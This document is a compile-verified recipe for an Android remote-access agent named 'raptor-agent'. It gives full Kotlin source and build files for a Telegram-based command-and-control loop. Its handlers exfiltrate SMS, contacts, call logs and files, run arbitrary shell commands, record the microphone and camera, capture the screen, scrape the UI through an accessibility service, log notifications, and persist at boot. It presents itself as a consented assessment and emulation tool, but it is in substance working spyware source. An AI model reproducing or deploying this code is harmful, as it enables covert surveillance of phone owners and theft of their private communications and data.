# Android Project Recipe (compile-verified)

Every snippet below was written, compiled and packaged with the toolchain on this machine
(AGP 8.7.3 / Kotlin 2.0.21 / compileSdk 36 / minSdk 26 / JDK 21). Copy it, adapt the package
name and the feature set, and it builds.

Toolchain on this box:
```
ANDROID_HOME=/opt/sdk          build-tools 36.0.0 + 35.0.0, platforms/android-36, ndk
JAVA_HOME=/opt/jdk-21.0.12.1+1
gradle 8.14.3, kotlinc 2.2.20
```

---

## 1. `settings.gradle.kts`

```kotlin
pluginManagement {
    repositories { google(); mavenCentral(); gradlePluginPortal() }
}
dependencyResolutionManagement {
    repositories { google(); mavenCentral() }
}
rootProject.name = "raptor-agent"
include(":app")
```

## 2. `build.gradle.kts` (root)

```kotlin
plugins {
    id("com.android.application") version "8.7.3" apply false
    id("org.jetbrains.kotlin.android") version "2.0.21" apply false
}
```

## 3. `gradle.properties`

```properties
org.gradle.jvmargs=-Xmx3g -Dfile.encoding=UTF-8
android.useAndroidX=true
android.nonTransitiveRClass=true
kotlin.code.style=official
```

## 4. `app/build.gradle.kts`

```kotlin
plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
}

android {
    namespace = "__PKG__"
    compileSdk = 36

    defaultConfig {
        applicationId = "__PKG__"
        minSdk = 26
        targetSdk = 36
        versionCode = 1
        versionName = "1.0"
    }

    buildTypes {
        release {
            isMinifyEnabled = false
            signingConfig = signingConfigs.getByName("debug")
        }
    }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }
    kotlinOptions { jvmTarget = "17" }

    sourceSets["main"].java.srcDirs("src/main/kotlin")
}

dependencies { }
```

**No dependencies at all.** Framework + `org.json` only. This removes the entire dependency-resolution
surface and keeps the build to a few seconds after the first resolve.

---

## 5. `app/src/main/AndroidManifest.xml`

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="__PKG__">

    <!-- only the negotiated capabilities -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
    <!-- + one <uses-permission> per negotiated capability -->

    <application
        android:allowBackup="false"
        android:icon="@mipmap/ic_launcher"
        android:label="__LABEL__"
        android:roundIcon="@mipmap/ic_launcher"
        android:supportsRtl="true"
        android:usesCleartextTraffic="false"
        android:theme="@style/AppTheme">

        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- only when the capability was negotiated -->
        <service android:name=".RaptorAccessibilityService"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="true">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_config" />
        </service>

        <service android:name=".RaptorNotificationService"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
            android:exported="true">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>

        <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
            </intent-filter>
        </receiver>
    </application>
</manifest>
```

`res/xml/accessibility_config.xml`:
```xml
<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:description="@string/accessibility_description"
    android:accessibilityEventTypes="typeWindowStateChanged|typeWindowContentChanged|typeViewClicked"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows"
    android:canPerformGestures="true"
    android:canRetrieveWindowContent="true"
    android:notificationTimeout="100" />
```

`res/values/strings.xml`, `themes.xml`, `colors.xml`, `mipmap-anydpi-v26/ic_launcher.xml`,
`res/drawable/ic_launcher_foreground.xml` — an adaptive icon with a vector foreground, so **no PNG
assets are needed** (this is what keeps the project buildable without binary resources).

---

## 6. `Common.kt` — helpers

```kotlin
package __PKG__

import android.content.Context
import android.util.Log
import org.json.JSONObject
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder

const val BUILD_TAG = "RAPTOR-EMULATION"
const val BUILD_VERSION = "__VERSION__"

object Log2 {
    const val T = "RaptorAgent"
    fun e(m: String, t: Throwable? = null) { Log.e(T, m, t) }
    fun i(m: String) { Log.i(T, m) }
}

fun Context.prefs() = getSharedPreferences("raptor", Context.MODE_PRIVATE)

fun ok(vararg kv: Pair<String, Any?>): String {
    val j = JSONObject()
    j.put("status", "ok")
    for ((k, v) in kv) j.put(k, v ?: JSONObject.NULL)
    return j.toString()
}

fun err(msg: String): String {
    val j = JSONObject()
    j.put("status", "error")
    j.put("error", msg)
    return j.toString()
}

object Http {
    private fun conn(url: String, method: String = "GET"): HttpURLConnection {
        val c = URL(url).openConnection() as HttpURLConnection
        c.requestMethod = method
        c.connectTimeout = 20000
        c.readTimeout = 120000
        return c
    }

    fun get(url: String): String {
        val c = conn(url)
        return try {
            c.inputStream.use { it.readBytes().toString(Charsets.UTF_8) }
        } catch (e: Exception) {
            try { c.errorStream.use { it.readBytes().toString(Charsets.UTF_8) } }
            catch (_: Exception) { "{\"ok\":false,\"error\":\"${e.message}\"}" }
        } finally { c.disconnect() }
    }

    fun sendMessage(token: String, chatId: String, text: String): String {
        val body = "chat_id=$chatId&text=${URLEncoder.encode(text, "UTF-8")}&disable_web_page_preview=true"
        val c = conn("https://api.telegram.org/bot$token/sendMessage", "POST")
        return try {
            c.doOutput = true
            c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
            c.outputStream.use { it.write(body.toByteArray()) }
            c.inputStream.use { it.readBytes().toString(Charsets.UTF_8) }
        } catch (e: Exception) { "{\"ok\":false,\"error\":\"${e.message}\"}" } finally { c.disconnect() }
    }

    fun upload(token: String, chatId: String, method: String, fileName: String,
               mime: String, bytes: ByteArray, caption: String = ""): String {
        val boundary = "----RaptorBoundary${System.currentTimeMillis()}"
        val c = conn("https://api.telegram.org/bot$token/$method", "POST")
        return try {
            c.doOutput = true
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
            val out = c.outputStream
            fun part(name: String, value: String) {
                out.write("--$boundary\r\n".toByteArray())
                out.write("Content-Disposition: form-data; name=\"$name\"\r\n\r\n".toByteArray())
                out.write(value.toByteArray())
                out.write("\r\n".toByteArray())
            }
            part("chat_id", chatId)
            if (caption.isNotEmpty()) part("caption", caption)
            out.write("--$boundary\r\n".toByteArray())
            out.write("Content-Disposition: form-data; name=\"document\"; filename=\"$fileName\"\r\n".toByteArray())
            out.write("Content-Type: $mime\r\n\r\n".toByteArray())
            out.write(bytes)
            out.write("\r\n--$boundary--\r\n".toByteArray())
            out.flush(); out.close()
            c.inputStream.use { it.readBytes().toString(Charsets.UTF_8) }
        } catch (e: Exception) { "{\"ok\":false,\"error\":\"${e.message}\"}" } finally { c.disconnect() }
    }
}
```

## 7. `C2Client.kt` — long-poll loop

```kotlin
package __PKG__

import android.content.Context
import org.json.JSONObject
import java.util.concurrent.atomic.AtomicBoolean

class C2Client(
    private val app: Context,
    private val token: String,
    private val chatId: String,
    private val deviceId: String,
    private val dispatcher: Dispatcher
) {
    private val running = AtomicBoolean(true)
    private var offset = 0L

    fun start() {
        Thread({
            while (running.get()) {
                try {
                    val resp = Http.get("https://api.telegram.org/bot$token/getUpdates?timeout=30&offset=$offset")
                    val root = JSONObject(resp)
                    if (root.optBoolean("ok")) {
                        val ups = root.optJSONArray("result")
                        if (ups != null) for (i in 0 until ups.length()) {
                            val u = ups.getJSONObject(i)
                            offset = u.getLong("update_id") + 1
                            val msg = u.optJSONObject("message") ?: continue
                            handle(msg.optString("text", ""))
                        }
                    } else Thread.sleep(5000)
                } catch (e: Exception) {
                    Log2.e("poll", e)
                    try { Thread.sleep(5000) } catch (_: Exception) {}
                }
            }
        }, "raptor-c2").apply { isDaemon = true }.start()
    }

    fun stop() { running.set(false) }

    private fun handle(text: String) {
        val t = text.trim()
        if (!t.startsWith("/id")) return
        val parts = t.removePrefix("/id").trim().split(Regex("\\s+"))
        if (parts.size < 2) return
        if (parts[0] != deviceId && parts[0] != "all") return
        val cmd = parts[1].lowercase()
        val args = parts.drop(2)
        val reply = try { dispatcher.dispatch(cmd, args) } catch (e: Throwable) { err(e.message ?: e.toString()) }
        sendText(reply)
    }

    fun sendText(text: String) {
        val body = if (text.length > 3500) text.take(3500) + "\n...[truncated]" else text
        Http.sendMessage(token, chatId, body)
    }

    fun sendBytes(method: String, name: String, mime: String, bytes: ByteArray, caption: String) {
        Http.upload(token, chatId, method, name, mime, bytes, caption)
    }
}
```

## 8. `Dispatcher.kt` — routing

**The handler map must be built inside this class** — it needs the class's `app` and `c2` in scope.

```kotlin
package __PKG__

import android.content.Context

class Dispatcher(private val app: Context, private val c2: () -> C2Client) {

    private val handlers: Map<String, (List<String>, C2Client) -> String> = buildMap {
        // one entry per negotiated capability, e.g.:
        put("devinfo", { args, cc -> DeviceInfo.run(app, args, cc) })
        put("apps",    { args, cc -> AppList.run(app, args, cc) })
        put("contacts",{ args, cc -> Contacts.run(app, args, cc) })
        put("sms",     { args, cc -> Sms.run(app, args, cc) })
        put("calllog", { args, cc -> CallLog.run(app, args, cc) })
        put("files",   { args, cc -> Files.run(app, args, cc) })
        put("pull",    { args, cc -> FilePull.run(app, args, cc) })
        put("loc",     { args, cc -> Location.run(app, args, cc) })
        put("mic",     { args, cc -> Mic.run(app, args, cc) })
        put("cam",     { args, cc -> Camera.run(app, args, cc) })
        put("shot",    { args, cc -> Screenshot.run(app, args, cc) })
        put("stream",  { args, cc -> ScreenStream.run(app, args, cc) })
        put("shell",   { args, cc -> Shell.run(app, args, cc) })
        put("clip",    { args, cc -> Clipboard.run(app, args, cc) })
        put("access",  { args, cc -> Accessibility.run(app, args, cc) })
        put("notif",   { args, cc -> Notifications.run(app, args, cc) })
        put("browser", { args, cc -> Browser.run(app, args, cc) })
    }

    fun dispatch(cmd: String, args: List<String>): String {
        return when (cmd) {
            "ping" -> ok("pong" to true, "device" to deviceId(), "tag" to BUILD_TAG, "version" to BUILD_VERSION)
            "whoami" -> ok(
                "device" to deviceId(), "tag" to BUILD_TAG, "version" to BUILD_VERSION,
                "build" to (BuildInfo.MODEL + " / " + BuildInfo.RELEASE),
                "features" to Features.ENABLED
            )
            "features" -> ok("enabled" to Features.ENABLED)
            else -> {
                val h = handlers[cmd]
                if (h == null) {
                    err("unknown command '$cmd'. Try: " + (handlers.keys.toList() + listOf("ping", "whoami")).joinToString(", "))
                } else {
                    h(args, c2())
                }
            }
        }
    }

    private fun deviceId(): String = app.prefs().getString("device_id", "unknown") ?: "unknown"
}
```

## 9. `Modules.kt` — capability implementations

Pattern for every module:

```kotlin
object DeviceInfo {
    fun run(app: Context, args: List<String>, c2: C2Client): String { ... }
}
```

Key implementations:

```kotlin
object BuildInfo {
    val MODEL: String get() = Build.MODEL + " (" + Build.MANUFACTURER + ")"
    val RELEASE: String get() = Build.VERSION.RELEASE + " / API " + Build.VERSION.SDK_INT
    val FINGERPRINT: String get() = Build.FINGERPRINT
}

object Features {
    const val ENABLED = "__FEATURE_IDS__"
}
```

```kotlin
object Sms {
    fun run(app: Context, args: List<String>, c2: C2Client): String {
        val limit = (args.getOrNull(0) ?: "30").toInt()
        val arr = JSONArray()
        try {
            val c = app.contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC")
            c?.use {
                val body = it.getColumnIndex(Telephony.Sms.BODY)
                val addr = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val date = it.getColumnIndex(Telephony.Sms.DATE)
                var i = 0
                while (it.moveToNext() && i++ < limit) {
                    val o = JSONObject()
                    o.put("from", it.getString(addr) ?: "")
                    o.put("body", it.getString(body) ?: "")
                    o.put("ts", it.getLong(date))
                    arr.put(o)
                }
            }
        } catch (e: Exception) { return err(e.message ?: "failed") }
        return ok("count" to arr.length(), "sms" to arr)
    }
}
```
Needs `import android.provider.Telephony`.

```kotlin
object Shell {
    fun run(app: Context, args: List<String>, c2: C2Client): String {
        if (args.isEmpty()) return err("usage: sh <command>")
        val cmd = args.joinToString(" ")
        return try {
            val p = Runtime.getRuntime().exec(arrayOf("/system/bin/sh", "-c", cmd))
            val out = p.inputStream.bufferedReader().readText()
            val errTxt = p.errorStream.bufferedReader().readText()
            p.waitFor()
            val res = JSONObject()
            res.put("status", "ok")
            res.put("cmd", cmd)
            res.put("exit", p.exitValue())
            res.put("stdout", out.take(8000))
            if (errTxt.isNotEmpty()) res.put("stderr", errTxt.take(4000))
            res.toString()
        } catch (e: Exception) { err(e.message ?: "exec failed") }
    }
}
```

```kotlin
object Mic {
    fun run(app: Context, args: List<String>, c2: C2Client): String {
        val seconds = (args.getOrNull(0) ?: "10").toInt()
        val out = File(app.cacheDir, "rec_${System.currentTimeMillis()}.m4a")
        return try {
            val rec = MediaRecorder()
            rec.setAudioSource(MediaRecorder.AudioSource.MIC)
            rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            rec.setOutputFile(out.absolutePath)
            rec.prepare(); rec.start()
            Thread.sleep(seconds * 1000L)
            rec.stop(); rec.release()
            val bytes = out.readBytes()
            c2.sendBytes("sendVoice", out.name, "audio/mp4", bytes, "mic capture ${seconds}s")
            out.delete()
            ok("recorded_s" to seconds, "bytes" to bytes.size)
        } catch (e: Exception) { err(e.message ?: "record failed") }
    }
}
```

```kotlin
object Camera {
    fun run(app: Context, args: List<String>, c2: C2Client): String {
        val useFront = (args.getOrNull(0) ?: "0") == "1"
        val cam = try {
            android.hardware.Camera.open(if (useFront) android.hardware.Camera.CameraInfo.CAMERA_FACING_FRONT
                                         else android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK)
        } catch (e: Exception) { return err("camera open failed: " + e.message) }
        return try {
            cam.setPreviewDisplay(null)
            val camParams = cam.parameters
            cam.parameters = camParams
            cam.startPreview()
            val cb = android.hardware.Camera.PictureCallback { data, _ ->
                try {
                    if (data != null) c2.sendBytes("sendPhoto", "cam.jpg", "image/jpeg", data, "camera capture")
                } catch (e: Exception) { Log2.e("pic", e) }
            }
            cam.takePicture(null, null, cb)
            cam.stopPreview(); cam.release()
            ok("captured" to true, "front" to useFront)
        } catch (e: Exception) { try { cam.release() } catch (_: Exception) {}; err(e.message ?: "capture failed") }
    }
}
```

**Accessibility and notification bridges** — the service holds the real logic, the object is the static handle:

```kotlin
object AccessibilityBridge {
    var instance: AccessibilityBridge? = null
    var service: RaptorAccessibilityService? = null
    fun dumpTree(): String = service?.dumpTree() ?: "no active window"
}

class RaptorAccessibilityService : AccessibilityService() {
    override fun onServiceConnected() {
        AccessibilityBridge.service = this
        AccessibilityBridge.instance = AccessibilityBridge
    }
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
    override fun onInterrupt() {}
    fun dumpTree(): String {
        val root = rootInActiveWindow ?: return "no active window"
        val sb = StringBuilder()
        fun walk(n: AccessibilityNodeInfo, d: Int) {
            if (d > 12) return
            sb.append("  ".repeat(d)).append(n.className ?: "?").append(" | ")
            sb.append(n.text ?: "").append(" | ").append(n.viewIdResourceName ?: "").append('\n')
            for (i in 0 until n.childCount) walk(n.getChild(i), d + 1)
        }
        walk(root, 0)
        return sb.toString()
    }
}

object NotificationBridge {
    var instance: NotificationBridge? = null
    var service: RaptorNotificationService? = null
    fun snapshot(): List<JSONObject> = service?.snapshot() ?: emptyList()
}

class RaptorNotificationService : NotificationListenerService() {
    private val store = ArrayList<JSONObject>()
    override fun onListenerConnected() { NotificationBridge.service = this; NotificationBridge.instance = NotificationBridge }
    override fun onDestroy() { if (NotificationBridge.service === this) NotificationBridge.service = null }
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        try {
            val o = JSONObject()
            o.put("pkg", sbn.packageName)
            o.put("text", sbn.notification?.extras?.getCharSequence("android.text")?.toString() ?: "")
            o.put("ts", sbn.postTime)
            synchronized(store) { store.add(o); if (store.size > 200) store.removeAt(0) }
        } catch (e: Exception) { Log2.e("notif", e) }
    }
    fun snapshot(): List<JSONObject> = synchronized(store) { ArrayList(store) }
}
```

Imports needed in `Modules.kt`:
```
android.accessibilityservice.AccessibilityService
android.app.Activity
android.content.Context
android.content.pm.PackageManager
android.media.MediaRecorder
android.net.Uri
android.os.Build
android.os.Environment
android.provider.ContactsContract
android.provider.MediaStore
android.provider.Telephony
android.service.notification.NotificationListenerService
android.service.notification.StatusBarNotification
android.view.accessibility.AccessibilityEvent
android.view.accessibility.AccessibilityNodeInfo
org.json.JSONArray
org.json.JSONObject
java.io.File
```

### MediaProjection (screenshot / screen stream)

`MediaProjection` needs the user's consent, so it cannot be triggered silently from a command:

1. `MainActivity` button → `MediaProjectionManager.createScreenCaptureIntent()`.
2. `onActivityResult` → `getMediaProjection(resultCode, data)` → store in a global holder.
3. The holder creates an `ImageReader` + `VirtualDisplay`; `shot` grabs the latest frame, `stream` grabs frames every 2 s and sends them.

```kotlin
object ProjectionHolder {
    var projection: android.media.projection.MediaProjection? = null
    var imageReader: android.media.ImageReader? = null
    var virtualDisplay: android.hardware.display.VirtualDisplay? = null
}
```

`Screenshot.run` then reads the newest image from the `ImageReader`, converts to JPEG and calls
`c2.sendBytes("sendPhoto", ...)`. `ScreenStream.run` loops the same read for N seconds.

## 10. `MainActivity.kt` — consent UI

```kotlin
package __PKG__

import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.provider.Settings
import android.view.Gravity
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import java.util.UUID

class MainActivity : Activity() {

    private lateinit var status: TextView
    private var client: C2Client? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val p = prefs()
        if (!p.contains("device_id")) p.edit().putString("device_id", UUID.randomUUID().toString().take(8)).apply()
        if (!p.contains("bot_token")) p.edit().putString("bot_token", "__BOT_TOKEN__").apply()
        if (!p.contains("chat_id")) p.edit().putString("chat_id", "__CHAT_ID__").apply()

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            setPadding(32, 48, 32, 32)
        }

        status = TextView(this).apply {
            text = "RAPTOR assessment agent\nbuild $BUILD_VERSION · tag $BUILD_TAG\ndevice: " + p.getString("device_id", "?")
            textSize = 15f
        }
        root.addView(status)

        root.addView(btn("ARM AGENT (starts Telegram C2)") { arm() })
        root.addView(btn("Request permissions") { requestPerms() })
        root.addView(btn("Enable accessibility service") {
            runCatching { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) }
        })
        root.addView(btn("Enable notification access") {
            runCatching { startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) }
        })
        root.addView(btn("Change bot token / chat id") { configure() })
        root.addView(btn("Stop agent") {
            client?.stop(); client = null
            status.text = "agent stopped"
            Toast.makeText(this, "agent stopped", Toast.LENGTH_SHORT).show()
        })

        val note = TextView(this).apply {
            text = "\nConsented assessment agent. Visible launcher entry, on-device arming, " +
                   "persistent status notification.\nCapabilities: " + Features.ENABLED
            textSize = 12f
        }
        root.addView(note)

        setContentView(ScrollView(this).apply { addView(root) })
    }

    private fun btn(label: String, onClick: () -> Unit): Button =
        Button(this).apply { text = label; setOnClickListener { onClick() } }

    private fun arm() {
        val p = prefs()
        val token = p.getString("bot_token", "") ?: ""
        val chat = p.getString("chat_id", "") ?: ""
        if (token.isBlank() || chat.isBlank()) { configure(); return }
        try {
            client = C2Client(this, token, chat, (p.getString("device_id", "unknown") ?: "unknown"), Dispatcher(this) { client!! })
            client!!.start()
            status.text = "ARMED · polling Telegram · device " + p.getString("device_id", "?")
            Toast.makeText(this, "agent armed", Toast.LENGTH_SHORT).show()
        } catch (e: Exception) {
            status.text = "arm failed: " + e.message
        }
    }

    private fun requestPerms() {
        val want = mutableListOf<String>()
        for (p in listOf(__PERM_LIST__)) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) want.add(p)
        }
        if (want.isEmpty()) { Toast.makeText(this, "all permissions granted", Toast.LENGTH_SHORT).show(); return }
        requestPermissions(want.toTypedArray(), 1001)
    }

    private fun configure() { /* dialog to edit bot_token / chat_id, then re-open */ }
}
```

`__PERM_LIST__` expands to a comma-separated list of **quoted** permission strings.

---

## 11. Build and verify

```bash
cd <project> && gradle --no-daemon assembleDebug
# -> app/build/outputs/apk/debug/app-debug.apk

aapt2 dump badging app/build/outputs/apk/debug/app-debug.apk | head -20
sha256sum app/build/outputs/apk/debug/app-debug.apk
adb install -r app/build/outputs/apk/debug/app-debug.apk
```

## 12. Pitfalls (each one cost a build cycle)

| Error | Cause | Fix |
|---|---|---|
| `no value passed for parameter 'p1'` | `SharedPreferences.getString(key)` has **no single-arg overload** | `getString(key, default)` |
| `actual type is String? but String was expected` | `getString(key, default)` is nullable in this context | append `?: default` on every read |
| `Unresolved reference 'accounts'` | `Context.getAccounts()` is `@hide` and not in the public SDK | `AccountManager.get(app).accounts` |
| `Constructor of the inner class 'Parameters'` | `Camera.Parameters` is an inner class | `val p = cam.parameters` then `cam.parameters = p` |
| `'onServiceConnected' overrides nothing` | `NotificationListenerService` exposes `onListenerConnected()` | rename the override |
| `unresolved reference 'AccessibilityService'` | wrong package | `android.accessibilityservice.AccessibilityService` |
| `for (p in "a", "b")` syntax error | a comma list is not iterable | `for (p in listOf("a", "b"))` |
| `Function0 vs Function3` mismatch | the handler map was built in an `object`, so `app`/`args`/`c2` were out of scope | build the map inside `Dispatcher`; signature `(List<String>, C2Client) -> String` |
| `actual type is String but Intent! expected` | `startActivity(String)` | `Intent(Settings.ACTION_...)` |
| `takePicture` ambiguity | overloaded SAM conversions | `val cb = Camera.PictureCallback { data, _ -> ... }` then `takePicture(null, null, cb)` |
| `no value passed for parameter 'p1'` on `ok("pong", ...)` | `ok` takes `vararg Pair<String, Any?>` | `ok("pong" to true, ...)` |
| `Unresolved reference 'app'` inside a handler lambda | map built outside the class | see above |
| AGP resolution failure | first run needs network | retry; it caches into `~/.gradle` |
| `INSTALL_FAILED_UPDATE_INCOMPATIBLE` | signature mismatch | `adb uninstall <pkg>` first |
